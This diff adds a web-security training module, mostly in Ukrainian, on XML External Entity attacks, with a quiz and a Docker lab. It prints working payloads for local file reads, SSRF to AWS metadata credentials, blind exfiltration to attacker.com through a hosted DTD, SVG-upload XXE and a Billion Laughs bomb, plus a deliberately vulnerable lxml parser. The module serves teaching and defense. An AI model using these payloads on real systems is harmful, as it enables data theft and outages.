@@ -1,0 +1,200 @@
+<section class="module-header">
+  <h1>Модуль 15 — XML External Entity (XXE)</h1>
+  <p>Дізнайся, як XML-парсери можуть бути використані для читання файлів, виконання SSRF та ексфільтрації даних через розширення сутностей.</p>
+</section>
+
+<section class="theory-section">
+
+  <h2>Стародавня фіча, сучасна вразливість</h2>
+  <p>
+    XML був розроблений наприкінці 1990-х, і його творці вбудували потужну функцію — <strong>зовнішні сутності (external entities)</strong> — спосіб для XML-документа включати вміст із зовнішніх файлів або URL. На той час це здавалося чудовою ідеєю. Можна було визначити текстовий блок для повторного використання і посилатися на нього по всьому документу, або підтягувати дані з іншого файлу.
+  </p>
+  <p>
+    Проблема в тому, що "включити вміст із файлу" означає <strong>будь-який файл на сервері</strong>. А "включити вміст за URL" означає, що сервер зробить HTTP-запит на <strong>будь-яку URL, яку ти вкажеш</strong>. Коли додаток парсить надісланий користувачем XML із увімкненими зовнішніми сутностями, атакуючий може читати довільні файли з сервера, змушувати сервер з'єднуватися з внутрішніми сервісами (SSRF) та ексфільтрувати дані на свій сервер.
+  </p>
+  <p>
+    XXE — це одна з тих вразливостей, яка дивує людей, бо небезпечна поведінка — це не баг, а <em>фіча</em> специфікації XML. XML-парсер робить саме те, для чого він був створений. Вразливість полягає в тому, що ніхто не повинен використовувати цю фічу з ненадійним вводом.
+  </p>
+
+  <h2>XML-сутності та DTD — основи</h2>
+  <p>
+    Перед тим як експлуатувати XXE, тобі потрібно зрозуміти, як працюють XML-сутності. Document Type Definition (DTD) може визначати сутності — іменовані посилання, які розгортаються у значення під час парсингу XML. Думай про них як про змінні у мові програмування.
+  </p>
+
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>Тип</th><th>Синтаксис</th><th>Що робить</th></tr></thead>
+      <tbody>
+        <tr><td>Internal entity</td><td><code>&lt;!ENTITY name "value"&gt;</code></td><td>Розгортається у визначений рядок</td></tr>
+        <tr><td>External entity (file)</td><td><code>&lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;</code></td><td>Читає вміст локального файлу</td></tr>
+        <tr><td>External entity (URL)</td><td><code>&lt;!ENTITY name SYSTEM "http://internal:8080/"&gt;</code></td><td>Робить HTTP-запит і включає відповідь</td></tr>
+        <tr><td>Parameter entity</td><td><code>&lt;!ENTITY % name SYSTEM "url"&gt;</code></td><td>Використовується всередині самого DTD (для blind/OOB XXE)</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h2>Базова XXE — читання файлів</h2>
+  <p>
+    Найпростіша XXE-атака визначає зовнішню сутність, яка читає локальний файл, а потім посилається на цю сутність у тілі XML, щоб вміст файлу з'явився у відповіді сервера:
+  </p>
+  <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></pre>
+  <p>
+    Коли сервер парсить цей XML, він натрапляє на <code>&amp;xxe;</code> і замінює його вмістом <code>/etc/passwd</code>. Якщо додаток відображає або повертає розпарсений вміст XML, атакуючий бачить файл прямо у відповіді.
+  </p>
+
+  <h3 class="text-red">Vulnerable Code</h3>
+  <pre><code class="language-python">from lxml import etree
+
+@app.route('/parse', methods=['POST'])
+def parse():
+    xml_data = request.data
+    # DANGEROUS: resolves external entities by default
+    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
+    doc = etree.fromstring(xml_data, parser)
+    return etree.tostring(doc, pretty_print=True)</code></pre>
+
+  <h3 class="text-green">Safe Code</h3>
+  <pre><code class="language-python">import defusedxml.ElementTree as ET
+
+@app.route('/parse', methods=['POST'])
+def parse():
+    xml_data = request.data
+    # SAFE: defusedxml blocks DTDs, external entities, and entity expansion
+    doc = ET.fromstring(xml_data)
+    return ET.tostring(doc)</code></pre>
+
+  <div class="callout callout-success">
+    <strong>defusedxml:</strong> Python-бібліотека <code>defusedxml</code> — це drop-in заміна стандартних XML-бібліотек, яка за замовчуванням вимикає всі небезпечні XML-функції. Якщо ти парсиш XML у Python, <strong>завжди використовуй defusedxml</strong>. Вона блокує зовнішні сутності, обробку DTD та бомби розширення сутностей.
+  </div>
+
+  <h2>XXE для SSRF</h2>
+  <p>
+    Зовнішні сутності не лише читають файли — вони також можуть робити HTTP-запити. Це перетворює XXE на вектор Server-Side Request Forgery (SSRF):
+  </p>
+  <pre><code class="language-xml">&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></pre>
+  <p>
+    Цей пейлоад змушує сервер звернутися до ендпоінта метаданих AWS — який доступний тільки зсередини мережі AWS. Якщо додаток працює на EC2, атакуючий отримує IAM-креденшали інстансу. Це той самий вектор SSRF-атаки, який був використаний у зломі Capital One у 2019 році (хоча в тому конкретному випадку використовувався інший вектор SSRF, не XXE).
+  </p>
+
+  <h2>Blind XXE — коли ти не бачиш вивід</h2>
+  <p>
+    Що робити, якщо додаток парсить твій XML, але не повертає значення сутностей у відповіді? Потрібно ексфільтрувати дані out-of-band. Для цього використовуються <strong>parameter entities</strong> — сутності, які використовуються всередині самого DTD і можуть ініціювати HTTP-запити з викраденими даними:
+  </p>
+
+  <pre><code class="language-xml">&lt;!-- Step 1: Host this DTD file on your server (evil.dtd) --&gt;
+&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre>
+
+  <pre><code class="language-xml">&lt;!-- Step 2: Send this XML to the target --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;data&gt;test&lt;/data&gt;</code></pre>
+
+  <p>
+    Сервер завантажує твій зовнішній DTD, який читає локальний файл і потім робить HTTP-запит на твій сервер із вмістом файлу в URL. Ти бачиш дані в логах свого сервера. Складно? Так. Але це надійно працює проти багатьох XML-парсерів.
+  </p>
+
+  <h2>XXE через завантаження файлів</h2>
+  <p>
+    XXE виникає не лише в очевидних XML API-ендпоінтах. Багато форматів файлів під капотом є XML:
+  </p>
+  <ul>
+    <li><strong>SVG-зображення</strong> — векторна графіка на основі XML. Завантаж SVG із XXE-пейлоадами.</li>
+    <li><strong>DOCX/XLSX/PPTX</strong> — файли Microsoft Office — це ZIP-архіви, що містять XML-файли. Зміни внутрішній XML, щоб включити сутності.</li>
+    <li><strong>SOAP-запити</strong> — SOAP API використовують XML для всієї комунікації.</li>
+    <li><strong>RSS/Atom-стрічки</strong> — формати синдикації на основі XML.</li>
+    <li><strong>SAML assertions</strong> — токени автентифікації на основі XML, які використовуються в SSO.</li>
+  </ul>
+
+  <pre><code class="language-xml">&lt;!-- XXE via SVG upload --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE svg [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"&gt;
+  &lt;text x="10" y="20"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+
+  <div class="callout callout-info">
+    <strong>Порада:</strong> Тестуючи функції завантаження файлів, завжди спробуй завантажити SVG із XXE-пейлоадами. Багато бібліотек обробки зображень парсять SVG як XML і є вразливими. Навіть якщо додаток приймає лише PNG/JPG, спробуй змінити Content-Type на <code>image/svg+xml</code> і подивись, чи сервер обробить його.
+  </div>
+
+  <h2>Атака Billion Laughs (XML Bomb)</h2>
+  <p>
+    Пов'язана XML-атака — це denial-of-service атака "Billion Laughs", яка використовує вкладене розширення сутностей для споживання величезних обсягів пам'яті:
+  </p>
+  <pre><code class="language-xml">&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+  &lt;!-- ... repeat 7 more times ... --&gt;
+]&gt;
+&lt;data&gt;&amp;lol9;&lt;/data&gt;</code></pre>
+  <p>
+    Кожен рівень множить на 10, тому <code>&amp;lol9;</code> розгортається у 10^9 (один мільярд) копій "lol" — споживаючи гігабайти пам'яті та крашуючи парсер. Саме тому <code>defusedxml</code> також обмежує глибину розширення сутностей.
+  </p>
+
+  <div class="callout callout-danger">
+    <strong>Вплив:</strong> XXE може читати локальні файли (вихідний код, конфігурацію, креденшали), виконувати SSRF до внутрішніх сервісів (хмарні метадані, бази даних, адмінпанелі), ексфільтрувати дані out-of-band, спричиняти denial of service через розширення сутностей, а в рідкісних випадках — досягати RCE (через PHP-обгортку <code>expect://</code> або виконання процесів у .NET).
+  </div>
+
+</section>
+
+<section class="quiz-section">
+  <h2>Knowledge Check</h2>
+  <div class="quiz-container" id="quiz">
+    <div class="quiz-question" id="q1">
+      <h3>Question 1</h3>
+      <p>What XML feature is exploited in XXE attacks?</p>
+      <div class="quiz-options">
+        <button class="quiz-opt" data-q="1" data-val="a">XML namespaces</button>
+        <button class="quiz-opt" data-q="1" data-val="b">External entity declarations in the DTD</button>
+        <button class="quiz-opt" data-q="1" data-val="c">XML attributes</button>
+        <button class="quiz-opt" data-q="1" data-val="d">CDATA sections</button>
+      </div>
+      <div class="quiz-feedback" id="q1-feedback"></div>
+    </div>
+    <div class="quiz-question" id="q2">
+      <h3>Question 2</h3>
+      <p>How is blind XXE data exfiltrated when entity values aren't displayed?</p>
+      <div class="quiz-options">
+        <button class="quiz-opt" data-q="2" data-val="a">Using parameter entities that trigger HTTP requests to an attacker-controlled server carrying the data</button>
+        <button class="quiz-opt" data-q="2" data-val="b">Using JavaScript inside XML comments</button>
+        <button class="quiz-opt" data-q="2" data-val="c">Embedding the data in XML attributes</button>
+        <button class="quiz-opt" data-q="2" data-val="d">Sending the data via email</button>
+      </div>
+      <div class="quiz-feedback" id="q2-feedback"></div>
+    </div>
+    <div class="quiz-question" id="q3">
+      <h3>Question 3</h3>
+      <p>What is the best way to prevent XXE in Python?</p>
+      <div class="quiz-options">
+        <button class="quiz-opt" data-q="3" data-val="a">Filtering the string "ENTITY" from input</button>
+        <button class="quiz-opt" data-q="3" data-val="b">Limiting XML file size</button>
+        <button class="quiz-opt" data-q="3" data-val="c">Using <code>defusedxml</code> or disabling DTD loading and entity resolution</button>
+        <button class="quiz-opt" data-q="3" data-val="d">Encoding XML in base64 before parsing</button>
+      </div>
+      <div class="quiz-feedback" id="q3-feedback"></div>
+    </div>
+  </div>
+  <div class="quiz-result" id="quiz-result"></div>
+</section>
+
+<section class="lab-card">
+  <h2>Flask Lab — NeonParser</h2>
+  <p>Practice XXE attacks against a vulnerable XML processing service with 5 challenges:</p>
+  <div class="code-block">cd labs/xxe && docker compose up --build<br>Visit http://localhost:5012/</div>
+  <p class="text-muted">Challenges cover basic entity injection, blind OOB XXE, XXE→SSRF chaining, filter bypass, and SVG-based XXE.</p>
+</section>
